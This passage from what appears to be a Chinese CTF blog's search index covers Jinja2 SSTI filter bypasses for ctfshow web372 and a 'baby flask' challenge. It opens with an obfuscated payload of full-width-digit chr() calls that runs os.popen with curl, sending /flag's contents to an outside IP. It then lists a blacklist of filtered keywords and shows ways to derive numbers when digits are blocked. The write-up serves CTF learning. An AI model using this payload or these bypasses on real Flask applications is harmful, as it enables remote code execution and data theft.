cmd=chr(９５)%2bchr(９５)%2bchr(１０５)%2bchr(１０９)%2bchr(１１２)%2bchr(１１１)%2bchr(１１４)%2bchr(１１６)%2bchr(９５)%2bchr(９５)%2bchr(４０)%2bchr(３４)%2bchr(１１１)%2bchr(１１５)%2bchr(３４)%2bchr(４１)%2bchr(４６)%2bchr(１１２)%2bchr(１１１)%2bchr(１１２)%2bchr(１０１)%2bchr(１１０)%2bchr(４０)%2bchr(３４)%2bchr(９９)%2bchr(１１７)%2bchr(１１４)%2bchr(１０８)%2bchr(３２)%2bchr(１０４)%2bchr(１１６)%2bchr(１１６)%2bchr(１１２)%2bchr(５８)%2bchr(４７)%2bchr(４７)%2bchr(５６)%2bchr(４９)%2bchr(４６)%2bchr(５５)%2bchr(４９)%2bchr(４６)%2bchr(４９)%2bchr(５１)%2bchr(４６)%2bchr(５５)%2bchr(５４)%2bchr(５８)%2bchr(５３)%2bchr(５３)%2bchr(５３)%2bchr(５３)%2bchr(６３)%2bchr(１１２)%2bchr(６１)%2bchr(９６)%2bchr(９９)%2bchr(９７)%2bchr(１１６)%2bchr(３２)%2bchr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%2bchr(９６)%2bchr(３４)%2bchr(４１)%2bchr(４６)%2bchr(１１４)%2bchr(１０１)%2bchr(９７)%2bchr(１００)%2bchr(４０)%2bchr(４１)%}{%if x.eval(cmd)%}abc{%endif%} web372_(count)用上一题的将数字变成全角的payload照样可以， 补充baby flask12345'.','[','\\'','&quot;',''\\\\','+',':','_',&lt;/br&gt; 'chr','pop','class','base','mro','init','globals','get',&lt;/br&gt; 'eval','exec','os','popen','open','read',&lt;/br&gt; 'select','url_for','get_flashed_messages','config','request',&lt;/br&gt; 'count','length','０','１','２','３','４','５','６','７','８','９','0','1','2','3','4','5','6','7','8','9' 这道题的特点是过滤了数字和cont和length，怎么得到数字呢？ 123456789101112131415161718{% set test=(()|select|string|list)%}{% print(test) %}输出如下：['&lt;', 'g', 'e', 'n', 'e', 'r', 'a', 't', 'o', 'r', ' ', 'o', 'b', 'j', 'e', 'c', 't', ' ', 's', 'e', 'l', 'e', 'c', 't', '_', 'o', 'r', '_', 'r', 'e', 'j', 'e', 'c', 't', ' ', 'a', 't', ' ', '0', 'x', '7', 'f', '5', 'c', '7', 'b', '5', 'b', '9', 'b', 'a', '0', '&gt;']{% set test=(()|select|string|list).index('e')%}{% print(test) %}输出如下：2为什么是2呢？其实index('g')就是表示g在列表中的索引，问题又来了，想要得到值100或1000，想要得到更大的值怎么办呢，可以用运算符号比如输出如下{% set test=(()|select|string|list).index('e')%}{% print(test*test) %}输出如下：4","link":"/2023/11/10/SSTI%E6%BC%8F%E6%B4%9E/"}],"tags":[{"name":"Java","slug":"Java","link":"/tags/Java/"},{"name":"unSerialize","slug":"unSerialize","link":"/tags/unSerialize/"},{"name":"Network","slug":"Network","link":"/tags/Network/"},{"name":"Ctfshow","slug":"Ctfshow","link":"/tags/Ctfshow/"},{"name":"XXE","slug":"XXE","link":"/tags/XXE/"},{"name":"SSTI","slug":"SSTI","link":"/tags/SSTI/"},{"name":"Warmup","slug":"Warmup","link":"/tags/Warmup/"}],"categories":[]}